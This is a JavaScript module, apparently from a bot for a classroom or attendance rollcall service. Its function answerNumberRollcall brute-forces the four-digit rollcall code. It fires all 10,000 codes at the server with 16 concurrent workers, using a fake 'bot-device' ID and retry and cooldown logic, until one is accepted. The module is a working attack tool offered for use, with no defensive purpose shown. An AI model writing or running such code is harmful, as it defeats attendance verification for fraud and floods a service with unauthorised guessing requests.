'use strict';

const { TransientCooldownTracker } = require('../../core/cooldown');
const { classifyNumberResponse } = require('./classify');

/**
 * 
 * @param {import('../../http/client').TronClient} client 
 * @param {string|number} rollcallId 
 * @param {Object} options 
 * @returns {Promise<Object>}
 */
async function answerNumberRollcall(client, rollcallId, options = {}) {
  const concurrency = options.concurrency || 16;
  const requestRetries = options.requestRetries || 3;
  const cooldownTracker = options.cooldownTracker || new TransientCooldownTracker();
  let foundCode = 'NA';
  let stopFlag = false;

  const result = {
    status: 'stopped',
    message: '',
    code: 'NA',
  };

  const tryCode = async (code) => {
    if (stopFlag) return;
    const payload = { deviceId: 'bot-device', numberCode: String(code).padStart(4, '0') };

    for (let attempt = 0; attempt < requestRetries; attempt++) {
      if (stopFlag) return;
      
      try {
        await cooldownTracker.waitCooldown();
        const resp = await client.submitRollcallAnswer(rollcallId, payload);
        const classification = classifyNumberResponse(resp.status, resp.bodyText || '');

        if (classification.status === 'success') {
          stopFlag = true;
          foundCode = payload.numberCode;
          result.status = 'success';
          result.code = foundCode;
          return;
        } else if (classification.status === 'wrong_code') {
          return; // Wrong code, try next
        } else if (classification.status === 'unauthorized') {
          if (!stopFlag) {
            stopFlag = true;
            result.status = 'fatal';
            result.message = classification.message;
          }
          return;
        } else if (classification.status === 'transient_failure') {
          cooldownTracker.recordFailure();
        } else {
          // Unknown failure
          if (!stopFlag) {
            stopFlag = true;
            result.status = 'fatal';
            result.message = classification.message;
          }
          return;
        }
      } catch (err) {
        if (attempt === requestRetries - 1) {
          cooldownTracker.recordFailure();
        } else {
          await new Promise(r => setTimeout(r, 1000));
        }
      }
    }
  };

  // Build queue of codes
  const codes = [];
  for (let i = 0; i <= 9999; i++) codes.push(i);

  // Concurrency worker
  const worker = async () => {
    while (codes.length > 0 && !stopFlag) {
      const code = codes.shift();
      await tryCode(code);
    }
  };

  const workers = [];
  for (let i = 0; i < concurrency; i++) {
    workers.push(worker());
  }

  await Promise.all(workers);

  if (result.status === 'stopped' && !stopFlag) {
    result.status = 'transient';
    result.message = 'Brute force finished but code not found (transient/wrong code).';
  }

  return result;
}

module.exports = {
  answerNumberRollcall,
};
